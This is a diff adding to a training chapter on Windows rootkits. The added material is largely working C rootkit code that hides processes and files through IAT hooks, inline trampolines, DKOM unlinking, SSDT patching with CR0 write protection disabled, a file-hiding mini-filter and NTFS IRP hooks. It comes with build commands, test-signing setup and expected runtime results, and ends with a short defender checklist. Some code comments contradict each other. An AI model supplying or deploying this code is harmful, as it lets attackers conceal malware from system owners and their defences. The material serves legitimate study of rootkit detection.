@@ -38,6 +38,135 @@ a given operation.
 
 ---
 
+## WINDOWS SETUP
+
+This chapter involves kernel-mode C development. This is the most complex
+build environment in the manual. Take your time with this section — a broken
+toolchain means nothing compiles and nothing runs. Do this once, do it right.
+
+### Tools Required
+
+| Tool | Purpose | Requires Admin? |
+|------|---------|----------------|
+| Visual Studio 2022 (Community) | C compiler, linker, IDE | YES |
+| Windows Driver Kit (WDK) | Kernel headers, libs, driver build system | YES |
+| Windows SDK | User-mode Windows headers (usually installed with VS) | YES |
+| VirtualBox or VMware Workstation | Test VM — NEVER run rootkit drivers on your main machine | YES |
+| WinDbg Preview | Kernel debugger — attach from host to test VM | NO (Store app) |
+| Volatility 3 | Memory forensics, Python-based | NO |
+| OSR Driver Loader | Load unsigned drivers in test VM (TESTSIGNING mode) | YES (in test VM) |
+
+### Install Commands (Run as Administrator in PowerShell)
+
+**Step 1 — Visual Studio 2022 Community (includes C compiler)**
+
+Download and run the installer manually — the winget version works but
+the installer UI is easier for selecting the right workloads:
+
+```
+https://visualstudio.microsoft.com/downloads/
+```
+
+During install, select these workloads:
+- "Desktop development with C++"
+- Nothing else is required
+
+Verification (after install, open "Developer Command Prompt for VS 2022"):
+```
+cl
+```
+Expected output:
+```
+Microsoft (R) C/C++ Optimizing Compiler Version 19.xx.xxxxx for x64
+```
+Failure looks like `'cl' is not recognized` — means you opened regular
+PowerShell instead of the VS Developer Command Prompt. Use the Start Menu
+shortcut "Developer Command Prompt for VS 2022".
+
+**Step 2 — Windows Driver Kit (WDK)**
+
+The WDK version MUST match your Windows SDK version exactly.
+Download from:
+```
+https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk
+```
+
+The page lists the correct WDK version for your Windows SDK version.
+Install the WDK AFTER Visual Studio — it installs VS extensions automatically.
+
+Verification (in Developer Command Prompt):
+```
+dir "C:\Program Files (x86)\Windows Kits\10\Include\*\km\ntddk.h"
+```
+Expected output: one file path printed (the ntddk.h kernel header)
+Failure looks like "File Not Found" — means WDK didn't install correctly.
+Re-run the WDK installer as Administrator.
+
+**Step 3 — WinDbg Preview (kernel debugger)**
+
+```powershell
+winget install Microsoft.WinDbg
+```
+Expected output: `Successfully installed` message.
+Verification: Open Start Menu → search "WinDbg Preview" → it launches.
+No admin required to install, but kernel debugging operations inside
+WinDbg require the test VM to be configured first (see Step 5).
+
+**Step 4 — Volatility 3 (memory forensics)**
+
+Requires Python 3.8+. Run in regular PowerShell (no admin needed):
+```powershell
+pip install volatility3
+```
+Verification:
+```powershell
+vol -h
+```
+Expected output: Volatility 3 help text with list of plugins.
+Failure looks like `'vol' is not recognized` — means Python Scripts
+folder is not on your PATH. Run `python -m volatility3 -h` instead,
+or add `C:\Users\<you>\AppData\Local\Programs\Python\Python3x\Scripts`
+to PATH in System Environment Variables.
+
+**Step 5 — Test VM Setup (CRITICAL — do not skip)**
+
+> **WARNING**: Never load rootkit drivers on your main Windows machine.
+> Bugs in kernel code cause immediate Blue Screens of Death (BSOD).
+> A bad driver in a test VM = reboot the VM. A bad driver on your main
+> machine = BSOD, possible filesystem corruption.
+
+In your test VM (Windows 10/11, installed in VirtualBox/VMware):
+1. Open an Administrator Command Prompt INSIDE the VM
+2. Enable test signing (allows unsigned drivers to load):
+```
+bcdedit /set testsigning on
+```
+3. Enable kernel debugging over network (so WinDbg on your host can connect):
+```
+bcdedit /dbgsettings net hostip:<YOUR-HOST-IP> port:50000 key:1.2.3.4
+bcdedit /debug on
+```
+4. Reboot the test VM.
+5. In the bottom-right corner of the VM desktop you should see "Test Mode" watermark.
+
+Verification: The watermark "Windows 10 Test Mode" (or Windows 11) appears
+on the VM desktop after reboot.
+Failure looks like no watermark — means bcdedit command didn't take effect.
+Re-run as Administrator inside the VM, then reboot again.
+
+**Step 6 — OSR Driver Loader (load drivers in test VM)**
+
+Download from:
+```
+https://www.osronline.com/article.cfm%5Earticle=157.htm
+```
+Extract to the test VM. No install needed — run `OSRLOADER.exe` as Administrator.
+
+Verification: OSRLOADER.exe opens a GUI with a "Driver Path" field and a
+"Register Service" button.
+
+---
+
 ## Section 1 — User-Mode Rootkit: IAT Hooking
 
 The Import Address Table is an array of function pointers maintained
@@ -69,50 +198,61 @@ Application code compiled as:
 ```c
 #include <windows.h>
 
+// hook a function in the IAT of the current process
+// module_name: the DLL that exports the function (e.g. "psapi.dll")
+// func_name:   the function to hook (e.g. "EnumProcesses")
+// hook_func:   your replacement function
+// original_func: output — pointer to the original function (so you can call it)
 void iat_hook(const char *module_name, const char *func_name,
               PVOID hook_func, PVOID *original_func) {
     // Get base address of the module we're hooking in
-    HMODULE base = GetModuleHandleA(NULL);  // current process main module
+    HMODULE base = GetModuleHandleA(NULL);  // NULL = current process main module
 
+    // Parse the PE headers to find the import directory
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
-    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
+    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);  // e_lfanew = offset to NT header
 
+    // DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] = the import table descriptor
     IMAGE_IMPORT_DESCRIPTOR *import_dir =
         (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)base
         + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
-    // Walk import descriptors
+    // Walk import descriptors — one per imported DLL
     for (; import_dir->Name; import_dir++) {
         const char *dll_name = (const char*)((BYTE*)base + import_dir->Name);
-        if (_stricmp(dll_name, module_name) != 0) continue;
+        if (_stricmp(dll_name, module_name) != 0) continue;  // skip DLLs that aren't our target
 
         // Found the target DLL's import descriptor
+        // OriginalFirstThunk = names/ordinals of imported functions
         IMAGE_THUNK_DATA *thunk_orig = (IMAGE_THUNK_DATA*)((BYTE*)base
             + import_dir->OriginalFirstThunk);
+        // FirstThunk = the actual IAT (addresses written by loader)
         IMAGE_THUNK_DATA *thunk_iat  = (IMAGE_THUNK_DATA*)((BYTE*)base
             + import_dir->FirstThunk);
 
+        // Walk parallel arrays: thunk_orig gives names, thunk_iat gives addresses
         for (; thunk_orig->u1.Ordinal; thunk_orig++, thunk_iat++) {
-            if (IMAGE_SNAP_BY_ORDINAL(thunk_orig->u1.Ordinal)) continue;
+            if (IMAGE_SNAP_BY_ORDINAL(thunk_orig->u1.Ordinal)) continue;  // skip ordinal imports (no name)
 
+            // Get the import-by-name structure (contains the function name string)
             IMAGE_IMPORT_BY_NAME *iname =
                 (IMAGE_IMPORT_BY_NAME*)((BYTE*)base
                 + thunk_orig->u1.AddressOfData);
 
-            if (strcmp((char*)iname->Name, func_name) != 0) continue;
+            if (strcmp((char*)iname->Name, func_name) != 0) continue;  // not our target function
 
-            // Found the IAT entry
+            // FOUND the IAT entry — save the original function address
             *original_func = (PVOID)thunk_iat->u1.Function;
 
-            // Remove write protection
+            // IAT memory is read-only by default — make it writable
             DWORD old_protect;
             VirtualProtect(&thunk_iat->u1.Function, sizeof(PVOID),
                            PAGE_READWRITE, &old_protect);
 
-            // Overwrite with hook address
+            // Overwrite the IAT entry with our hook function address
             thunk_iat->u1.Function = (ULONG_PTR)hook_func;
 
-            // Restore protection
+            // Restore original memory protection
             VirtualProtect(&thunk_iat->u1.Function, sizeof(PVOID),
                            old_protect, &old_protect);
             return;
@@ -120,22 +260,25 @@ void iat_hook(const char *module_name, const char *func_name,
     }
 }
 
-// Example hook: hide our process from EnumProcesses
+// Define a function pointer type matching EnumProcesses signature
 typedef BOOL (WINAPI *pfnEnumProcesses)(DWORD*, DWORD, DWORD*);
-pfnEnumProcesses orig_EnumProcesses = NULL;
+pfnEnumProcesses orig_EnumProcesses = NULL;  // will hold original function pointer
 
+// Our hook — called instead of the real EnumProcesses
 BOOL WINAPI hook_EnumProcesses(DWORD *pids, DWORD cb, DWORD *bytes_returned) {
+    // First, call the REAL EnumProcesses to get the actual list
     BOOL result = orig_EnumProcesses(pids, cb, bytes_returned);
-    if (!result) return result;
+    if (!result) return result;  // if the real call failed, just return the failure
 
-    DWORD our_pid = GetCurrentProcessId();
-    DWORD count = *bytes_returned / sizeof(DWORD);
+    DWORD our_pid = GetCurrentProcessId();  // get our own PID to hide
+    DWORD count = *bytes_returned / sizeof(DWORD);  // total number of PIDs returned
 
-    // Remove our PID from the returned array
+    // Scan the returned PID array and remove our PID from it
     for (DWORD i = 0; i < count; i++) {
         if (pids[i] == our_pid) {
+            // Shift everything after index i one slot left (overwrites our PID)
             memmove(&pids[i], &pids[i+1], (count - i - 1) * sizeof(DWORD));
-            *bytes_returned -= sizeof(DWORD);
+            *bytes_returned -= sizeof(DWORD);  // shrink the reported count by one
             count--;
             break;
         }
@@ -143,10 +286,35 @@ BOOL WINAPI hook_EnumProcesses(DWORD *pids, DWORD cb, DWORD *bytes_returned) {
     return result;
 }
 
-// Install the hook
+// Install the hook — redirects all EnumProcesses calls in this process
 iat_hook("psapi.dll", "EnumProcesses",
          hook_EnumProcesses, (PVOID*)&orig_EnumProcesses);
 ```
+
+### Expected Output
+
+**Build:** Compile this as a DLL with Visual Studio (see Windows Setup). In the
+Developer Command Prompt:
+```
+cl /LD iat_hook.c /link /OUT:hook.dll user32.lib kernel32.lib psapi.lib
+```
+Expected output:
+```
+Microsoft (R) C/C++ Optimizing Compiler Version 19.xx ...
+iat_hook.c
+   Creating library hook.lib and object hook.exp
+```
+
+**Runtime success:** After injecting the DLL and calling `hook_EnumProcesses`,
+a tool calling `EnumProcesses` from the same process will not see your PID in
+the returned array.
+
+**Failure looks like `LNK2019: unresolved external symbol _EnumProcesses`** —
+means you forgot to link psapi.lib. Add `/link psapi.lib` to the cl command.
+
+**Failure looks like access violation on `VirtualProtect`** — means you passed
+a bad address. Double-check that `thunk_iat` is inside the IAT range before
+writing to it.
 
 ### Limitations of IAT Hooking
 
@@ -201,18 +369,19 @@ TRAMPOLINE (allocated stub):
 ```c
 #include <windows.h>
 
+// Bookkeeping structure for one installed hook
 typedef struct {
-    PVOID  original_func;
-    PVOID  hook_func;
-    BYTE   original_bytes[16];
-    BYTE   trampoline[32];
+    PVOID  original_func;       // address of the function we hooked
+    PVOID  hook_func;           // address of our replacement
+    BYTE   original_bytes[16];  // saved copy of original bytes before patching
+    BYTE   trampoline[32];      // executable stub: original bytes + jmp back
 } HOOK;
 
 int install_inline_hook(PVOID target, PVOID hook, HOOK *h) {
     h->original_func = target;
     h->hook_func     = hook;
 
-    // Save original bytes
+    // Save original bytes so we can restore or build the trampoline
     memcpy(h->original_bytes, target, 16);
 
     // Build trampoline:
@@ -229,33 +398,52 @@ int install_inline_hook(PVOID target, PVOID hook, HOOK *h) {
     //   XX XX XX XX XX XX XX XX   <64-bit address>
     // Total: 14 bytes
 
-    // Copy original bytes to trampoline
+    // Copy first 14 original bytes to the trampoline buffer
     memcpy(tramp, target, 14);
 
-    // Append jmp back to original+14
+    // Append a jump from the trampoline back into the original function at +14
     BYTE *jmp_back = tramp + 14;
-    *(WORD*)jmp_back = 0x25FF;               // JMP [RIP+0]
-    *(DWORD*)(jmp_back + 2) = 0;             // RIP+0 offset
-    *(PVOID*)(jmp_back + 6) = (PBYTE)target + 14;  // absolute target
+    *(WORD*)jmp_back = 0x25FF;               // opcode: JMP [RIP+0] (indirect absolute jump)
+    *(DWORD*)(jmp_back + 2) = 0;             // RIP+0 displacement (address follows immediately)
+    *(PVOID*)(jmp_back + 6) = (PBYTE)target + 14;  // the absolute destination address
 
-    // Make trampoline executable
+    // Mark the trampoline buffer executable so the CPU can run it
     DWORD old;
     VirtualProtect(h->trampoline, 32, PAGE_EXECUTE_READWRITE, &old);
 
-    // Patch target function with jmp to hook
+    // Patch the real function: overwrite its first 14 bytes with a jump to our hook
     DWORD old2;
-    VirtualProtect(target, 14, PAGE_EXECUTE_READWRITE, &old2);
+    VirtualProtect(target, 14, PAGE_EXECUTE_READWRITE, &old2);  // remove write protection
 
     PBYTE patch = (PBYTE)target;
     *(WORD*)patch = 0x25FF;                  // JMP [RIP+0]
-    *(DWORD*)(patch + 2) = 0;               // RIP+0 offset
-    *(PVOID*)(patch + 6) = hook;            // absolute hook address
+    *(DWORD*)(patch + 2) = 0;               // RIP+0 displacement
+    *(PVOID*)(patch + 6) = hook;            // absolute address of our hook function
 
-    VirtualProtect(target, 14, old2, &old2);
+    VirtualProtect(target, 14, old2, &old2);  // restore original protection
 
     return 0;
 }
 ```
+
+### Expected Output
+
+**Build:** Compile as a DLL:
+```
+cl /LD inline_hook.c /link /OUT:inline_hook.dll kernel32.lib
+```
+Expected output: `Creating library inline_hook.lib and object inline_hook.exp`
+
+**Runtime success:** After installing the hook, calls to the target function
+execute your hook code first, then continue through the trampoline to the
+original function. The original function's behavior is preserved.
+
+**Failure looks like infinite loop / stack overflow** — means the trampoline
+jumps back to the START of the patched function instead of past the patch.
+Check that `(PBYTE)target + 14` is past all patched bytes.
+
+**Failure looks like BSOD / access violation** — means you forgot
+`VirtualProtect` before patching. The code section is execute-only by default.
 
 ### Trampoline Pattern Summary
 
@@ -301,15 +489,28 @@ checked by every security tool ever written.
 ### Windows Hook (SetWindowsHookEx)
 
 ```c
-// Install a system-wide keyboard hook
-// Windows will inject your DLL into EVERY process that processes keystrokes
+// Install a system-wide keyboard hook.
+// Windows will inject your DLL into EVERY process that processes keystrokes.
+// h_dll: handle to the DLL containing the hook procedure
 HMODULE h_dll = LoadLibraryA("hook.dll");
+// Get the address of our exported hook function inside the DLL
 HOOKPROC hook_proc = (HOOKPROC)GetProcAddress(h_dll, "KeyboardProc");
+// WH_KEYBOARD_LL = low-level keyboard hook (runs in this process, not injected)
+// h_dll = the DLL to inject for non-LL hooks; 0 as thread ID = global (all threads)
 HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, h_dll, 0);
 
 // 0 as thread ID = global hook — all threads in all processes
 // Your DLL gets injected into every process in the session
 ```
+
+### Expected Output
+
+**Runtime success:** After calling `SetWindowsHookExA`, the return value
+(`HHOOK hook`) is non-NULL. A NULL return means failure — call `GetLastError()`
+to get the error code.
+
+**Failure looks like `hook = NULL`, GetLastError returns `ERROR_HOOK_NEEDS_HMOD (1428)`**
+— means you passed NULL as the module handle for a non-global hook type.
 
 SetWindowsHookEx legitimately injects DLLs as part of normal Windows
 functionality. It's visible but the mechanism itself is not suspicious.
@@ -327,6 +528,11 @@ modify kernel memory directly.
 DKOM is the oldest and most fundamental kernel rootkit technique.
 Specifically: process hiding by unlinking the EPROCESS structure
 from the doubly-linked list that the kernel uses to track processes.
+
+> **REMINDER**: All kernel-mode code in this section runs inside a
+> Windows kernel driver. You need the WDK build environment from the
+> Windows Setup section above. Never load and test these drivers on
+> your main machine — use the test VM with TESTSIGNING=ON.
 
 ### The EPROCESS Structure
 
@@ -349,39 +555,69 @@ If you unlink EPROCESS(your.exe):
 ### DKOM Implementation (Concept)
 
 ```c
-// Run in kernel mode (requires a driver)
-// Target: hide the process with a given PID
+// This code runs in kernel mode (requires a driver loaded by Windows)
+// Target: hide the process with a given PID from the active process list
 
 VOID HideProcess(ULONG target_pid) {
     PEPROCESS target_process;
 
-    // PsLookupProcessByProcessId — get EPROCESS pointer by PID
+    // PsLookupProcessByProcessId — kernel API to get EPROCESS pointer by PID
+    // Returns STATUS_SUCCESS if the PID exists; increments reference count
     if (!NT_SUCCESS(PsLookupProcessByProcessId(
             (HANDLE)(ULONG_PTR)target_pid, &target_process))) {
-        return;
+        return;  // PID not found — nothing to do
     }
 
-    // Get the ActiveProcessLinks offset
+    // Get the ActiveProcessLinks field inside the EPROCESS structure
     // This offset varies by Windows version — must be determined per-version
     // On Windows 10 21H2 x64: ActiveProcessLinks is at EPROCESS+0x448
     PLIST_ENTRY process_links = (PLIST_ENTRY)(
         (PUCHAR)target_process + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET
     );
 
-    // Unlink from the list
-    PLIST_ENTRY prev = process_links->Blink;
-    PLIST_ENTRY next = process_links->Flink;
+    // Doubly-linked list unlink:
+    // Our node: [Blink] ← [process_links] → [Flink]
+    // After: Blink->Flink = Flink, Flink->Blink = Blink
+    PLIST_ENTRY prev = process_links->Blink;  // node before us in the list
+    PLIST_ENTRY next = process_links->Flink;  // node after us in the list
 
-    prev->Flink = next;  // bypass our node going forward
-    next->Blink = prev;  // bypass our node going backward
+    prev->Flink = next;  // previous node now skips past us, points to next
+    next->Blink = prev;  // next node now skips past us, points to previous
 
-    // Null our own links to prevent crash if someone walks to us
+    // Point our own links at ourselves (circular self-reference)
+    // This prevents crashes if something walks to our node directly
     process_links->Flink = process_links;
     process_links->Blink = process_links;
 
+    // Decrement reference count — required after PsLookupProcessByProcessId
     ObDereferenceObject(target_process);
 }
 ```
+
+### Expected Output
+
+**Build (WDK driver project in Visual Studio):**
+1. File → New → Project → "Kernel Mode Driver, Empty (KMDF)"
+2. Add a .c file with your DriverEntry and HideProcess function
+3. Build → the output is a .sys file (kernel driver binary)
+
+Expected build output (in Visual Studio Output window):
+```
+========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
+```
+
+**Runtime success (in test VM):**
+1. Load the .sys file via OSR Driver Loader → "Register Service" → "Start Service"
+2. From your test app, call into the driver via DeviceIoControl with the target PID
+3. Run `tasklist` in the VM — the target process is gone from the list
+4. The process window is still visible and running
+
+**Failure looks like BSOD with `SYSTEM_THREAD_EXCEPTION_NOT_HANDLED`** —
+means the offset `EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET` is wrong for your
+Windows build. Use the Finding Offsets section below to get the correct value.
+
+**Failure looks like `0xC000000D STATUS_INVALID_PARAMETER`** from
+PsLookupProcessByProcessId — means the PID doesn't exist or is already dead.
 
 ### Finding EPROCESS Offsets
 
@@ -448,24 +684,28 @@ Syscall 0x36 (NtQuerySystemInformation):
 // Must find it via:
 //   1. Pattern scan in ntoskrnl.exe (look for KiSystemCall64 and trace to table)
 //   2. Or use undocumented KeServiceDescriptorTable via reverse engineering
+PLONG ssdt = GetKiServiceTableAddress(); // your implementation (pattern scan)
 
-PLONG ssdt = GetKiServiceTableAddress(); // your implementation
-
-// Get current offset for syscall 0x36
+// Get current offset for syscall 0x36 (NtQuerySystemInformation)
 LONG original_offset = ssdt[0x36];
 
-// Calculate original function address
+// Calculate original function address from the encoded offset
+// The SSDT stores (address - tablebase) << 4 | arg_count
 PVOID original_func = (PVOID)(
-    (ULONG_PTR)ssdt + (original_offset >> 4)
+    (ULONG_PTR)ssdt + (original_offset >> 4)  // >> 4 strips the arg count from low bits
 );
 
-// Build your hook function
+// Our hook function — called instead of NtQuerySystemInformation
 NTSTATUS NTAPI hook_NtQuerySystemInformation(
-    SYSTEM_INFORMATION_CLASS info_class,
-    PVOID info, ULONG info_len, PULONG return_len
+    SYSTEM_INFORMATION_CLASS info_class,  // what kind of info is requested
+    PVOID info,                           // output buffer
+    ULONG info_len,                       // output buffer size
+    PULONG return_len                     // how many bytes were written
 ) {
+    // Call the real NtQuerySystemInformation first to get real data
     NTSTATUS status = original_func(info_class, info, info_len, return_len);
 
+    // If caller wants process info and the call succeeded, filter our process out
     if (info_class == SystemProcessInformation && NT_SUCCESS(status)) {
         // Walk SYSTEM_PROCESS_INFORMATION linked list
         // Remove our process's entry
@@ -474,21 +714,36 @@ NTSTATUS NTAPI hook_NtQuerySystemInformation(
     return status;
 }
 
-// Patch the SSDT entry
-// Must disable write protection on SSDT memory:
-//   CR0 bit 16 (Write Protect) — clear it to write to read-only pages
-ULONG_PTR cr0 = __readcr0();
-__writecr0(cr0 & ~0x10000);  // clear WP bit
+// Patch the SSDT entry — must disable write protection on SSDT memory first
+// CR0 register bit 16 = Write Protect bit; clearing it allows writing to read-only pages
+ULONG_PTR cr0 = __readcr0();        // read current CR0 value
+__writecr0(cr0 & ~0x10000);         // clear bit 16 (WP bit) — now we can write to SSDT
 
-// Calculate new offset (hook_func relative to ssdt base, shifted)
+// Encode our hook address as an SSDT offset (same format as original)
 LONG new_offset = (LONG)(
     ((ULONG_PTR)hook_NtQuerySystemInformation - (ULONG_PTR)ssdt) << 4
-    | arg_count
+    | arg_count  // preserve the argument count in low 4 bits
 );
-ssdt[0x36] = new_offset;
+ssdt[0x36] = new_offset;            // overwrite the SSDT entry for syscall 0x36
 
-__writecr0(cr0);  // restore WP bit
+__writecr0(cr0);  // restore WP bit — write protection back on
 ```
+
+### Expected Output
+
+**Build:** Same WDK driver project as DKOM section. Successful build produces a .sys file.
+
+**Runtime success (in test VM, TESTSIGNING=ON):** After loading the driver and
+installing the hook, all calls to NtQuerySystemInformation with
+SystemProcessInformation class across ALL processes will go through your hook.
+A `tasklist` in any cmd window will not show the hidden process.
+
+**Failure looks like BSOD `CRITICAL_STRUCTURE_CORRUPTION (0x109)`** — PatchGuard
+detected the SSDT modification. This is EXPECTED on x64 Windows 10/11.
+See the "Why SSDT Hooks Are Mostly Dead" section below.
+
+**Failure looks like BSOD `PAGE_FAULT_IN_NONPAGED_AREA`** — the SSDT address
+resolution returned a wrong address. Your pattern scan is broken.
 
 ### Why SSDT Hooks Are Mostly Dead
 
@@ -560,52 +815,74 @@ specific file paths or extensions.
 ### Mini-Filter Registration
 
 ```c
-#include <fltKernel.h>
+#include <fltKernel.h>  // WDK header for Filter Manager API
 
-PFLT_FILTER filter_handle;
+PFLT_FILTER filter_handle;  // handle to our registered filter
 
 // Pre-operation callback: called BEFORE the IRP reaches the FS driver
+// This is where you intercept and optionally block I/O
 FLT_PREOP_CALLBACK_STATUS PreReadCallback(
-    PFLT_CALLBACK_DATA Data,
-    PCFLT_RELATED_OBJECTS FltObjects,
-    PVOID *CompletionContext
+    PFLT_CALLBACK_DATA Data,           // contains IRP data and I/O parameters
+    PCFLT_RELATED_OBJECTS FltObjects,  // related objects: filter, volume, file
+    PVOID *CompletionContext           // optional: data to pass to post-op callback
 ) {
-    // Check if this is a read of our hidden file
+    // Get the name of the file being accessed
     PUNICODE_STRING file_name = &FltObjects->FileObject->FileName;
 
+    // Check if this access is to our hidden file
     if (RtlEqualUnicodeString(file_name, &HIDDEN_FILE, TRUE)) {
-        // Complete the IRP with STATUS_OBJECT_NAME_NOT_FOUND
-        // Caller gets "file not found" — file is invisible
+        // Return "file not found" to the caller — file is invisible
         Data->IoStatus.Status = STATUS_OBJECT_NAME_NOT_FOUND;
-        return FLT_PREOP_COMPLETE;  // don't pass to FS driver
+        return FLT_PREOP_COMPLETE;  // don't pass IRP down to the FS driver
     }
 
-    return FLT_PREOP_SUCCESS_WITH_CALLBACK;  // pass through
+    return FLT_PREOP_SUCCESS_WITH_CALLBACK;  // pass through to FS driver normally
 }
 
+// Registration array: maps IRP major function codes to our callback functions
 FLT_OPERATION_REGISTRATION callbacks[] = {
-    { IRP_MJ_READ, 0, PreReadCallback, NULL },
-    { IRP_MJ_DIRECTORY_CONTROL, 0, PreDirCallback, NULL },
-    { IRP_MJ_OPERATION_END }
+    { IRP_MJ_READ, 0, PreReadCallback, NULL },                  // intercept reads
+    { IRP_MJ_DIRECTORY_CONTROL, 0, PreDirCallback, NULL },      // intercept directory listings
+    { IRP_MJ_OPERATION_END }                                     // sentinel — marks end of array
 };
 
+// Filter registration structure — tells Filter Manager about our filter
 FLT_REGISTRATION filter_registration = {
-    sizeof(FLT_REGISTRATION),
-    FLT_REGISTRATION_VERSION,
-    0,
-    NULL,
-    callbacks,
-    FilterUnloadCallback,
-    InstanceSetupCallback,
-    NULL, NULL, NULL, NULL, NULL, NULL
+    sizeof(FLT_REGISTRATION),    // size of this structure (version check)
+    FLT_REGISTRATION_VERSION,    // version constant from fltKernel.h
+    0,                           // flags (none)
+    NULL,                        // context registration (none for this example)
+    callbacks,                   // our operation callback array
+    FilterUnloadCallback,        // called when filter is unloaded
+    InstanceSetupCallback,       // called when attaching to a new volume
+    NULL, NULL, NULL, NULL, NULL, NULL  // optional callbacks we don't use
 };
 
+// DriverEntry — kernel entry point, called when driver loads
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+    // Register our filter with Filter Manager
     FltRegisterFilter(DriverObject, &filter_registration, &filter_handle);
+    // Start receiving callbacks — filter is now active on all volumes
     FltStartFiltering(filter_handle);
     return STATUS_SUCCESS;
 }
 ```
+
+### Expected Output
+
+**Build:** In Visual Studio with WDK, create a "Kernel Mode Driver (KMDF)" project.
+Add the code above. Build should succeed with:
+```
+========== Build: 1 succeeded, 0 failed ==========
+```
+
+**Failure looks like `error C1083: Cannot open include file: 'fltKernel.h'`** —
+means the WDK is not installed or not integrated with Visual Studio. Re-run
+the WDK installer and make sure "Visual Studio Integration" is checked.
+
+**Runtime success (in test VM):** After loading the driver, attempting to open
+the hidden file from any application returns "File not found". The file still
+exists on disk — only the I/O path is intercepted.
 
 A filter driver hiding files intercepts IRP_MJ_DIRECTORY_CONTROL
 (directory enumeration) and IRP_MJ_CREATE (file open attempts) —
@@ -625,25 +902,37 @@ one per major function code (IRP_MJ_READ, IRP_MJ_WRITE, etc.). Overwriting
 an entry redirects all IRPs of that type for that device.
 
 ```c
-// Target driver's dispatch table entry for IRP_MJ_READ
+// Obtain a pointer to NTFS's driver object by name
+// (IoGetDriverObjectPointer looks up a driver by its registered device name)
 PDRIVER_OBJECT ntfs_driver_obj;  // obtained via IoGetDriverObjectPointer
 
-// Save original handler
+// Save the original IRP_MJ_READ handler so we can call it later
 PDRIVER_DISPATCH orig_read = ntfs_driver_obj->MajorFunction[IRP_MJ_READ];
 
-// Install hook
+// Replace the IRP_MJ_READ handler with our hook function
+// All future read IRPs to NTFS devices will call hook_read first
 ntfs_driver_obj->MajorFunction[IRP_MJ_READ] = hook_read;
 
-// Hook function
+// Our hook — intercepts every read IRP before NTFS processes it
 NTSTATUS hook_read(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+    // Get the current stack location — contains parameters for this IRP
     PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
     // Inspect file name, modify data, etc.
     // ...
 
-    // Pass to original handler
+    // Pass IRP to the original NTFS read handler — real read still happens
     return orig_read(DeviceObject, Irp);
 }
 ```
+
+### Expected Output
+
+**Runtime success:** The hook intercepts reads. You can log file paths,
+modify data in the read buffer, or block specific files.
+
+**Failure looks like BSOD `CRITICAL_STRUCTURE_CORRUPTION (0x109)`** —
+PatchGuard detected the dispatch table modification on a monitored driver.
+Same as SSDT hooks — PatchGuard watches dispatch tables of critical drivers.
 
 PatchGuard also monitors dispatch table integrity on critical drivers.
 Same caveat as SSDT: eventually triggers BSOD.
@@ -944,6 +1233,63 @@ volatility -f memory.img windows.driverirp — IRP dispatch tables
 
 ---
 
+## DEFENDER TAKEAWAY
+
+You built the tools. Now you know what to watch for. Here is what to
+actually DO on Monday morning to detect and prevent rootkit activity
+in a real Windows environment.
+
+- **Enable and monitor Event ID 7045 (System log)** — fires every time a
+  new service (driver) is installed. A BYOVD attack loads a vulnerable
+  driver first. This event will show it. Alert on any driver installation
+  that isn't part of a scheduled software deployment, especially drivers
+  with random-looking names or located outside `C:\Windows\System32\drivers\`.
+
+- **Enable and monitor Event ID 6 (Microsoft-Windows-CodeIntegrity/Operational)**
+  — logs every kernel driver load attempt, including ones that fail DSE
+  checks. Blocked attempts mean someone is trying to load an unsigned driver.
+  This catches BYOVD attempts that fail.
+
+- **Check AppInit_DLLs registry key regularly** — the key
+  `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`
+  should be blank on any hardened system. Any value here means a DLL is
+  being injected into every GUI process. Audit this with:
+  ```
+  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
+  ```
+  Expected: `AppInit_DLLs` value is empty or the key shows `(value not set)`.
+
+- **Run Autoruns (Sysinternals) weekly and diff against last week's output.**
+  Autoruns shows every persistence mechanism Windows supports. Save the
+  output as a text file each week. A new entry in the Drivers or AppInit
+  sections that you didn't install is a red flag.
+
+- **Use Process Explorer (Sysinternals) with VirusTotal integration enabled.**
+  Right-click any unknown process → Check VirusTotal. More importantly:
+  Process Explorer reads kernel structures directly — it is NOT fooled by
+  IAT hooks in other processes. A process visible in Process Explorer but
+  not in `tasklist` indicates a user-mode rootkit hooking the tasklist process.
+
+- **Verify SSDT integrity with a periodic WinDbg check on a monitored system.**
+  In WinDbg attached to a live kernel: `dq nt!KiServiceTable L200` — every
+  address should resolve to a function inside a loaded driver module.
+  An address outside any driver range = SSDT hook installed.
+
+- **Enable Secure Boot and verify it is active** — go to Settings → System →
+  Recovery → Advanced startup → Restart → UEFI Firmware Settings and confirm
+  Secure Boot is ON. This blocks all MBR/UEFI bootkits that lack a valid
+  Secure Boot bypass. It is the single highest-value hardware-level control
+  against rootkit persistence.
+
+- **Take periodic memory snapshots of critical servers using DumpIt or WinPMem.**
+  Run `volatility windows.psscan` vs `windows.pslist` on each snapshot and
+  diff the results. Any process in psscan but not pslist is a hidden process.
+  Any unexpected executable private memory region from `windows.malfind` is
+  injected code. Do this monthly on domain controllers and file servers — the
+  machines most worth rooting.
+
+---
+
 ## Key Terms
 
 | Term | Definition |
@@ -966,6 +1312,8 @@ volatility -f memory.img windows.driverirp — IRP dispatch tables
 | **pslist vs psscan** | Volatility comparison: pslist walks the linked list (DKOM-bypassable), psscan finds pool tags in raw memory (DKOM-resistant) |
 | **malfind** | Volatility plugin that finds executable private memory containing PE signatures — primary tool for detecting code injection |
 | **Kernel callbacks** | Registered notification routines called by the kernel on process/thread/image events; EDRs use these for early visibility |
+| **WDK** | Windows Driver Kit — Microsoft's SDK for kernel-mode driver development; required to compile any code that runs as a Windows driver |
